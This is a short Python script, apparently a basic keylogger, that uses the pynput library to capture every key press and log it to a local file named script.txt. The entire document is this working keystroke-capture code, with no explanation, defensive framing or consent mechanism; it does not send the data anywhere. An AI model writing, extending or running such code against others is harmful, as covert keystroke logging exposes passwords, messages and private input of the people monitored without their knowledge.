import logging
from pynput.keyboard import Listener

EnteredData = ""

logging.basicConfig(filename=EnteredData + "script.txt", level=logging.DEBUG, format='%(message)s')

def on_press(key):
    logging.info(str(key))

    
with Listener(on_press=on_press) as listerner:
    listerner.join()



    